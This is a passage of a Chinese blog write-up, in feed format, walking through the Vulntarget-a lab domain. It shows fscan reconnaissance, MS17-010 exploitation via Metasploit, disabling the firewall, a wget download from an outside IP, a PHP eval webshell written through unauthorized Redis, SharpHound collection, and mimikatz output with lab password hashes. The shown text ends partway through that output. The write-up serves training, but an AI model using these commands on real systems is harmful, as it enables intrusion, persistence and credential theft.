    <summary type="html">&lt;p&gt;目标ip 192.168.52.128&lt;/p&gt;
&lt;p&gt;先使用fscan扫一下&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/s</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Vulntarget-a</title>
    <link href="https://ke1nys.github.io/posts/55206aca.html"/>
    <id>https://ke1nys.github.io/posts/55206aca.html</id>
    <published>2023-11-13T02:20:11.000Z</published>
    <updated>2023-12-06T02:51:48.637Z</updated>
    
    <content type="html"><![CDATA[<p>192.168.52.132  外网目标ip</p><p>fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/vulntarget]</span><br><span class="line">└─# ./fscan_amd64 -h 192.168.52.132 -p 1-10000                                                 </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 192.168.52.132  is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">192.168.52.132:110 open</span><br><span class="line">192.168.52.132:80 open</span><br><span class="line">192.168.52.132:135 open</span><br><span class="line">192.168.52.132:139 open</span><br><span class="line">192.168.52.132:445 open</span><br><span class="line">192.168.52.132:1188 open</span><br><span class="line">192.168.52.132:3336 open</span><br><span class="line">192.168.52.132:5357 open</span><br><span class="line">192.168.52.132:8750 open</span><br><span class="line">[*] alive ports len is: 9</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.52.132</span><br><span class="line">   [-&gt;]win7-PC</span><br><span class="line">   [-&gt;]192.168.52.132</span><br><span class="line">   [-&gt;]10.0.20.128</span><br><span class="line">[*] WebTitle: http://192.168.52.132:8750 code:403 len:564    title:403 Forbidden</span><br><span class="line">[+] 192.168.52.132      MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle: http://192.168.52.132:5357 code:503 len:326    title:Service Unavailable</span><br><span class="line">[*] WebTitle: http://192.168.52.132     code:200 len:10065  title:通达OA网络智能办公系统</span><br><span class="line">[+] InfoScan:http://192.168.52.132     [通达OA] </span><br><span class="line">[+] http://192.168.52.132 tongda-user-session-disclosure </span><br><span class="line">[+] http://192.168.52.132:8750 tongda-user-session-disclosure </span><br><span class="line">已完成 9/9</span><br><span class="line">[*] 扫描结束,耗时: 18.303575184s</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">信息整理一下 </span><br><span class="line">192.168.52.132  通达存在漏洞  MS-17  名字Win7-PC 常规端口 </span><br><span class="line">10.0.20.128  内网地址</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接打MS17就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search MS17</span><br><span class="line">use 0</span><br><span class="line">set rhosts 192.168.52.132</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113103421107.png" alt="image-20231113103421107"></p><p>直接上线  开始信息收集一下 </p><p><img src="../images/image-20231113103608843.png" alt="image-20231113103608843"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解决乱码</span><br><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off  关闭防火墙命令</span><br><span class="line"></span><br><span class="line">不关闭防火墙的话  MSF和cs的马都上不去</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Ethernet adapter �������� 2:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::55ef:46ff:3f4:a6b3%13</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.0.20.128</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : </span><br><span class="line"></span><br><span class="line">Ethernet adapter ��������:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::1c54:a862:b6a5:1f6c%11</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.52.132</span><br></pre></td></tr></table></figure><p>收集到的信息 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.132  外网地址</span><br><span class="line">10.0.20.128 内网地址</span><br></pre></td></tr></table></figure><p>上传一个fscan扫一下内网  并且上代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://101.42.39.110:3389/fscan64.exe</span><br><span class="line"></span><br><span class="line">这里我是用msf的upload模块来上传这个fscan64.exe</span><br><span class="line"></span><br><span class="line">upload fscan64.exe C:\\</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;fscan64.exe -h 10.0.20.0/24 -p 1-10000</span><br><span class="line">fscan64.exe -h 10.0.20.0/24 -p 1-10000</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.0.20.128     is alive</span><br><span class="line">(icmp) Target 10.0.20.130     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 2</span><br><span class="line">10.0.20.130:80 open</span><br><span class="line">10.0.20.128:80 open</span><br><span class="line">10.0.20.128:110 open</span><br><span class="line">10.0.20.128:135 open</span><br><span class="line">10.0.20.130:139 open</span><br><span class="line">10.0.20.128:139 open</span><br><span class="line">10.0.20.130:135 open</span><br><span class="line">10.0.20.128:445 open</span><br><span class="line">10.0.20.130:445 open</span><br><span class="line">10.0.20.128:1188 open</span><br><span class="line">10.0.20.128:3336 open</span><br><span class="line">10.0.20.128:5357 open</span><br><span class="line">10.0.20.130:5985 open</span><br><span class="line">10.0.20.130:6379 open</span><br><span class="line">10.0.20.128:8750 open</span><br><span class="line">[*] alive ports len is: 15</span><br><span class="line">start vulscan</span><br><span class="line">[+] 10.0.20.128 MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.20.128</span><br><span class="line">   [-&gt;]win7-PC</span><br><span class="line">   [-&gt;]192.168.52.132</span><br><span class="line">   [-&gt;]10.0.20.128</span><br><span class="line">[*] WebTitle: http://10.0.20.128:8750   code:403 len:564    title:403 Forbidden</span><br><span class="line">[*] WebTitle: http://10.0.20.128        code:200 len:10065  title:通达OA网络智能办公系统</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.20.130</span><br><span class="line">   [-&gt;]win2016</span><br><span class="line">   [-&gt;]10.0.10.111</span><br><span class="line">   [-&gt;]10.0.20.130</span><br><span class="line">[+] Redis:10.0.20.130:6379 unauthorized file:C:\Program Files\Redis/dump.rdb</span><br><span class="line">[*] WebTitle: http://10.0.20.130        code:200 len:11     title:None</span><br><span class="line">[+] InfoScan:http://10.0.20.128        [通达OA] </span><br><span class="line">[*] WebTitle: http://10.0.20.128:5357   code:503 len:326    title:Service Unavailable</span><br><span class="line">[*] NetBios: 10.0.20.130     win2016.vulntarget.com              Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://10.0.20.130:5985   code:404 len:315    title:Not Found</span><br><span class="line">[+] http://10.0.20.128 tongda-user-session-disclosure </span><br><span class="line">[+] http://10.0.20.128:8750 tongda-user-session-disclosure </span><br><span class="line">[+] http://10.0.20.128:8750 poc-yaml-tongda-oa-v11.9-api.ali.php-fileupload </span><br><span class="line">已完成 15/15</span><br><span class="line">[*] 扫描结束,耗时: 56.0155853s</span><br></pre></td></tr></table></figure><p>信息整理一下  一共就是两个ip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">10.0.20.128</span><br><span class="line">10.0.20.130 这个就是域里的一台机器 5985 6379  win2016.vulntarget.com  </span><br><span class="line">域 vulntarget.com  6379端口是存在未授权的</span><br><span class="line"></span><br><span class="line">这里的这台win16机器的网络地址</span><br><span class="line"></span><br><span class="line">10.0.20.130</span><br><span class="line">10.0.10.111</span><br></pre></td></tr></table></figure><p>上stowaway挂代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload agent.exe C:\\</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113104956522.png" alt="image-20231113104956522"></p><p>然后扫一下目录 发现phpinfo.php文件</p><p><img src="../images/image-20231113105109436.png" alt="image-20231113105109436"></p><p>找到网站目录  然后因为redis纯在未授权  然后我们直接上传shell就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">config set dir &quot;C:/phpStudy/PHPTutorial/WWW/&quot;</span><br><span class="line"></span><br><span class="line">config set dbfilename 1.php</span><br><span class="line"></span><br><span class="line">set 1 &quot;&lt;?php @eval($_POST[&#x27;1&#x27;]);?&gt;&quot;</span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113105410071.png" alt="image-20231113105410071"></p><p>成功写入  然后上蚁剑</p><p><img src="../images/image-20231113105550525.png" alt="image-20231113105550525"></p><p>上传fscan扫一下内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   IPv4 地址 . . . . . . . . . . . . : 10.0.20.130</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : </span><br><span class="line">以太网适配器 Ethernet1:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::a195:ff2a:a6da:221c%12</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 10.0.10.111</span><br></pre></td></tr></table></figure><p>但是蚁剑这个终端的话太抽象了  fscan扫不了  于是上Viper</p><p><img src="../images/image-20231113110229946.png" alt="image-20231113110229946"></p><p>上线成功  开始扫一下内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan64.exe -h 10.0.10.0/24 -p 1-10000</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113110402882.png" alt="image-20231113110402882"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\PHPTutorial\WWW&gt;type result.txt</span><br><span class="line">type result.txt</span><br><span class="line">10.0.10.110:53 open</span><br><span class="line">10.0.10.110:88 open</span><br><span class="line">10.0.10.111:80 open</span><br><span class="line">10.0.10.110:139 open</span><br><span class="line">10.0.10.110:135 open</span><br><span class="line">10.0.10.111:135 open</span><br><span class="line">10.0.10.111:139 open</span><br><span class="line">10.0.10.110:389 open</span><br><span class="line">10.0.10.110:445 open</span><br><span class="line">10.0.10.111:445 open</span><br><span class="line">10.0.10.110:464 open</span><br><span class="line">10.0.10.110:593 open</span><br><span class="line">10.0.10.110:636 open</span><br><span class="line">10.0.10.110:3268 open</span><br><span class="line">10.0.10.110:3269 open</span><br><span class="line">10.0.10.111:5985 open</span><br><span class="line">10.0.10.110:5985 open</span><br><span class="line">10.0.10.111:6379 open</span><br><span class="line">10.0.10.110:9389 open</span><br><span class="line">[+] Redis:10.0.10.111:6379 unauthorized file:C:\phpStudy\PHPTutorial\WWW/1.php</span><br><span class="line">[*] WebTitle: http://10.0.10.111        code:200 len:11     title:None</span><br><span class="line">[*] NetBios: 10.0.10.110     [+]DC VULNTARGET\WIN2019       </span><br><span class="line">[*] WebTitle: http://10.0.10.111:5985   code:404 len:315    title:Not Found</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.10.110</span><br><span class="line">   [-&gt;]win2019</span><br><span class="line">   [-&gt;]10.0.10.110</span><br><span class="line">[*] WebTitle: http://10.0.10.110:5985   code:404 len:315    title:Not Found</span><br><span class="line">10.0.10.110:135 open</span><br><span class="line">10.0.10.111:135 open</span><br><span class="line">10.0.10.110:139 open</span><br><span class="line">10.0.10.110:88 open</span><br><span class="line">10.0.10.111:80 open</span><br><span class="line">10.0.10.111:139 open</span><br><span class="line">10.0.10.110:53 open</span><br><span class="line">10.0.10.110:389 open</span><br><span class="line">10.0.10.110:445 open</span><br><span class="line">10.0.10.111:445 open</span><br><span class="line">10.0.10.110:464 open</span><br><span class="line">10.0.10.110:593 open</span><br><span class="line">10.0.10.110:636 open</span><br><span class="line">10.0.10.110:3268 open</span><br><span class="line">10.0.10.110:3269 open</span><br><span class="line">10.0.10.111:5985 open</span><br><span class="line">10.0.10.110:5985 open</span><br><span class="line">10.0.10.111:6379 open</span><br><span class="line">10.0.10.110:9389 open</span><br><span class="line">[+] Redis:10.0.10.111:6379 unauthorized file:C:\phpStudy\PHPTutorial\WWW/1.php</span><br><span class="line">[*] WebTitle: http://10.0.10.111        code:200 len:11     title:None</span><br><span class="line">[*] WebTitle: http://10.0.10.111:5985   code:404 len:315    title:Not Found</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.10.110</span><br><span class="line">   [-&gt;]win2019</span><br><span class="line">   [-&gt;]10.0.10.110</span><br><span class="line">[*] NetBios: 10.0.10.110     [+]DC VULNTARGET\WIN2019       </span><br><span class="line">[*] WebTitle: http://10.0.10.110:5985   code:404 len:315    title:Not Found</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现域控了 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.0.10.110 DC VULNTARGET\WIN2019    开了个5985端口  winrm服务</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>收集一下域内win16的信息  看看有没有能到域控的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">跑一下sharphound  上传sharphound上去  然后跑就行了</span><br><span class="line"></span><br><span class="line">SharpHound.exe --CollectionMethods All --Domain vulntarget.com --ExcludeDCs</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113111238366.png" alt="image-20231113111238366"></p><p>这里就是关键了  因为域管登录过win16这台机器  所以留下了凭据 </p><p>我们直接上mimikatz跑logonpassword就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 329364 (00000000:00050694)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : win2016</span><br><span class="line">Domain            : VULNTARGET</span><br><span class="line">Logon Server      : WIN2019</span><br><span class="line">Logon Time        : 2023/11/11 22:30:17</span><br><span class="line">SID               : S-1-5-21-3795598892-1521228294-2653055093-1601</span><br><span class="line">        msv :</span><br><span class="line">         [00000005] Primary</span><br><span class="line">         * Username : win2016</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * NTLM     : dfc8d2bfa540a0a6e2248a82322e654e</span><br><span class="line">         * SHA1     : cfa10f59337120a5ea6882b11c1c9f451f5f4ea6</span><br><span class="line">         * DPAPI    : 27bd7cc4802079a6e008ed2d917c4323</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : win2016</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win2016</span><br><span class="line">         * Domain   : VULNTARGET.COM</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 71684 (00000000:00011804)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/11/11 22:29:13</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000005] Primary</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * NTLM     : e0cd419213811fd910ca6c3c42d764e7</span><br><span class="line">         * SHA1     : cd721f807e68ce07a4d0fe80b9356e93986d5ef1</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : vulntarget.com</span><br><span class="line">         * Password : NDjm,P3trN$LQ-$cZ9bE&lt;VNzB$JaIR4&gt;T+JNW7Qk?gHpDo(+H&gt;zF^t-gG&gt;,0MmLMBzfZ^ ]/oRL*&lt;&gt;j,WTp+5yF2cA.d%b&gt;^:n/Bmf64:Qx.:/s5Y1&quot;&gt;5&gt;wZ</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 71573 (00000000:00011795)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/11/11 22:29:13</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000005] Primary</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * NTLM     : 1ee53d0627d3a9c940d6579e3ea1d158</span><br><span class="line">         * SHA1     : 668e4f390b4fa54225f4a12106fbceab3056f83c</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : vulntarget.com</span><br><span class="line">         * Password : 27 7d f9 fa 4a f9 61 25 60 4e 75 42 f7 d9 c6 a0 60 c7 f1 eb 48 b3 73 bf 64 0e dd 5b 92 46 f1 2a cb 7d 19 a4 38 19 aa fb 8a a7 56 ca 40 fb 07 3b f3 c7 d4 ca b7 f3 32 49 56 92 69 78 a0 f4 66 5b 8a 40 46 9e ac 7e dc a7 18 85 68 68 65 d1 b3 1a b3 8b 76 e8 c8 ec 18 58 78 86 10 0e ae 1d 2f b5 ac 9c 29 2c c9 6e d6 eb f3 70 91 fd f4 12 11 e0 8d 48 e4 89 20 73 f4 c0 ae d3 d0 f1 45 e0 be e3 39 6a 8f 7e a4 08 4c a7 41 3d ef 23 ad 19 f4 c1 21 b1 9e 81 39 99 33 d3 8f 83 d6 49 02 59 f7 b9 6d 63 bb 2e 50 be 8f 4e f4 37 7a fa 13 95 93 d6 80 96 c0 d1 7b c6 2c 90 ca 1e 0a da 42 8b 3e 92 c7 65 85 45 41 a4 b6 76 21 35 e2 96 94 a4 07 28 c3 49 d9 31 05 24 28 07 de 8c 64 fa 8d 93 d3 ed ec 4c 75 e5 e1 05 bc 6f 6b 41 ef ed d9 f2 43 a4 </span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN2016$</span><br><span class="line">Domain            : VULNTARGET</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/11/11 22:29:13</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">         [00000005] Primary</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * NTLM     : 1ee53d0627d3a9c940d6579e3ea1d158</span><br><span class="line">         * SHA1     : 